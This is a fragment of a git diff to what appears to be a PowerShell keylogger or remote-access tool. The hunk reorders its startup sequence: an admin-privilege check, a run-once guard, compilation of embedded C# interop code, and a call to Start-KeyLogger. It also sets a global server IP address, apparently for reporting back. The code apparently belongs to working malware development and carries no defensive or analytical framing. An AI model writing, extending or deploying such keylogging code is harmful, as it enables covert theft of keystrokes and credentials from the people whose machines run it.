@@ -1128,10 +1128,10 @@ namespace TsakAsother
 }
 "@
 
-Add-Type -ReferencedAssemblies System, System.Runtime.InteropServices -TypeDefinition $Source -Language CSharp
-Assert-Admin 
-Start-KeyLogger 
+Assert-Admin
 Assert-RunOnce
+Add-Type -ReferencedAssemblies System, System.Runtime.InteropServices -TypeDefinition $Source -Language CSharp 
+Start-KeyLogger 
 Add-Type -AssemblyName System.Security
 Set-Variable -Scope Global -Name "bultInVars" -Value ((Get-Variable).Name)
 $global:SERVIP = "192.168.137.1"
